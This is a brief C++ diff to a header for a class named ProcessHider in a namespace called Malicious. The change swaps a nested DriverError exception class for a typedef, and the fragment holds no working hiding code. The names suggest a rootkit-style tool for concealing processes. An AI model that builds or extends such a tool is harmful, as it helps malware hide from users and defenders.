@@ -10,15 +10,11 @@
 
 namespace Malicious
 {
+	typedef Exception DriverError;
+
     class ProcessHider
     {
         public:
-
-            class DriverError : public Exception
-            {
-                public:
-                    DriverError(const std::string& argMsgError);
-            };
 
             ProcessHider();
             ~ProcessHider();
